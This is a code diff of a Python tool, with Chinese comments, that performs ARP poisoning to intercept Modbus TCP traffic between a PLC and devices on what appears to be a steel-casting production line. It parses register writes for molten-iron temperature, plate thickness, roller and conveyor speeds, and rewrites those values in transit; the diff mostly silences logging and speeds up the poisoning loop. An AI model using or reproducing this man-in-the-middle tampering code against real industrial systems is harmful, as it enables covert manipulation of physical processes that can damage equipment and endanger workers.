@@ -153,7 +153,7 @@ def insert_data_into_db_tgzm(connection, iron_water, steel_plate, roller, mold, 
                        VALUES (%s, %s, %s, %s, %s, %s)"""
         cursor.execute(query, (iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2))
         connection.commit()  # 提交事务
-        print("数据插入成功")
+        #print("数据插入成功")
     except Error as e:
         print(f"插入数据时出错: {e}")
     finally:
@@ -228,7 +228,7 @@ def send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface):
     # 伪造网关到目标设备的 ARP 包
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
     send(packet, iface=iface, verbose=False)
-    print(f"[INFO] ARP: {gateway_ip} ({attacker_mac}) -> {target_ip} ({target_mac})")
+    #print(f"[INFO] ARP: {gateway_ip} ({attacker_mac}) -> {target_ip} ({target_mac})")
 
 
 def save_data_in_thread(b1, b2, b3):
@@ -242,7 +242,7 @@ def parse_modbus_data(packet, sport, dport):
             # 获取 Modbus TCP 数据部分（去除 MBAP header 的前 7 字节）
             modbus_zdata = bytes(packet[TCP].payload)
             payload = modbus_zdata
-            print(f"modbus数据: {modbus_zdata}")
+            #print(f"modbus数据: {modbus_zdata}")
             mbap_header = modbus_zdata[:7]  # 解析 MBAP 头部
             modbus_data = modbus_zdata[7:]  # Modbus 数据（功能码及其数据）
 
@@ -297,7 +297,7 @@ def parse_modbus_data(packet, sport, dport):
                         else:
                             xmodbus_data += bb2.to_bytes(2, byteorder='big')  # 将 b2 转为 2 字节并加入
                         xmodbus_data += b3.to_bytes(2, byteorder='big')  # 将 b3 转为 2 字节并加入
-                        print(f"篡改数据成功")
+                        #print(f"篡改数据成功")
                     else:
                         # 将 modbus_data[0:2], b1, b2, b3 组合到一起
                         xmodbus_data = modbus_data[0:2]  # 保留 modbus_data 的前两字节
@@ -308,7 +308,7 @@ def parse_modbus_data(packet, sport, dport):
                     modbus_tdate = mbap_header  # MBAP header 前 7 字节
                     modbus_tdate += xmodbus_data  # 合并 xmodbus_data 到 modbus_tdate
                     payload = modbus_tdate
-                    print(f"new modbus_zdata: {binascii.hexlify(modbus_tdate)}")
+                    #print(f"new modbus_zdata: {binascii.hexlify(modbus_tdate)}")
 
                 else:
                     return payload
@@ -335,12 +335,12 @@ def parse_modbus_data(packet, sport, dport):
                     a5 = int.from_bytes(register_values[8:10], byteorder='big')  # 传送带1速度单位为cm/s，可能是向下取整
                     a6 = int.from_bytes(register_values[10:12], byteorder='big')  # 传送带2速度单位为cm/s，可能是向下取整
 
-                    #print_data_tgzm(a1, a2, a3, a4, a5, a6)
+                    # 创建线程执行 print_data_tgzm
+                    print_thread = threading.Thread(target=print_data_tgzm, args=(a1, a2, a3, a4, a5, a6))
+                    print_thread.start()  # 启动线程
                     # 输出结果
-                    print(
-                        f"写多个保持寄存器: 起始地址: {register_address}, 寄存器数量: {register_count}, 字节数: {byte_count}, 值: {binascii.hexlify(register_values)}")
-                    print(
-                        f"铁水wendu（K）: {a1}, houdu(m): {a2}, zhiji（mm）: {a3}, mojuwendu（K）: {a4}, 传送带1sudu: {a5}, 传送带2sudu: {a6}")
+                    #print(f"写多个保持寄存器: 起始地址: {register_address}, 寄存器数量: {register_count}, 字节数: {byte_count}, 值: {binascii.hexlify(register_values)}")
+                    #print(f"铁水wendu（K）: {a1}, houdu(m): {a2}, zhiji（mm）: {a3}, mojuwendu（K）: {a4}, 传送带1sudu: {a5}, 传送带2sudu: {a6}")
                     # 这个可以对这6个变量进行修改，是plc控制生产线的初始数据
                     #xa1, xa2, xa3, xa4, xa5, xa6, loag = read_data_tgzm()
                     loag = 0
@@ -547,7 +547,7 @@ def main():
             observed_mac = getmacbyip(target_ip)
             if observed_mac != gateway_mac:
                 print(f"[INFO] ARP 已被篡改: {observed_mac}")
-            time.sleep(2)
+            time.sleep(1)
 
     except KeyboardInterrupt:
         # 捕获 Ctrl+C，停止攻击
